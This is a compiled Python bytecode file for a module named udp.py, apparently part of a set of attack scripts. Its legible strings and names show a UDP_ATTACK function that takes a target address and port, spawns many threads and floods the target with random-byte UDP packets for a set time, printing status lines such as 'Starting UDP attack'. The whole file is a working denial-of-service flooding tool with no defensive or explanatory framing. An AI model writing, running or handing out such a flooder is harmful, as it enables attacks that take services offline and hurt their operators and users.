a
    g�`�  �                   @   s0   d dl Z d dlZd dlZd dlmZ dd� ZdS )�    N)�Threadc                    s�   da |�d�d � t|�d�d ��td� g }� �fdd�}t| �D ]4}tdt|� d	 � t|d
�}|��  |�|� qFt	�
|� |D ]}da |��  q�td� d S )NF�:r   �   z%[1;34m[*][0m Starting UDP attack...c               
      s�   t � t jt j�} trq�z4td�D ]&}t�t�dd��}| �|� �f� q W n, t	yv } zt
|� W Y d }~qd }~0 0 t
dtt|�� d � qd S )N�   r   �<   z$[1;32m[+][0m UDP packet with size z
 was sent!)�socketZAF_INETZ
SOCK_DGRAM�FINISH�range�random�_urandom�randintZsendto�	Exception�print�str�len)Zsock�_Zpayload�e�Z	target_ipZtarget_port� �2/storage/emulated/0/Script Vip/toolso/other/udp.py�	udp_flood   s    zUDP_ATTACK.<locals>.udp_floodz[1;34m[*][0m Staring thread z...)�targetTz [1;77m[i][0m Attack completed.)r   �split�intr   r	   r   r   �start�append�time�sleep�join)ZthreadsZattack_timer   Zthreads_listr   �thread�tr   r   r   �
UDP_ATTACK   s     


r!   )r
   r   r   Z	threadingr   r!   r   r   r   r   �<module>   s   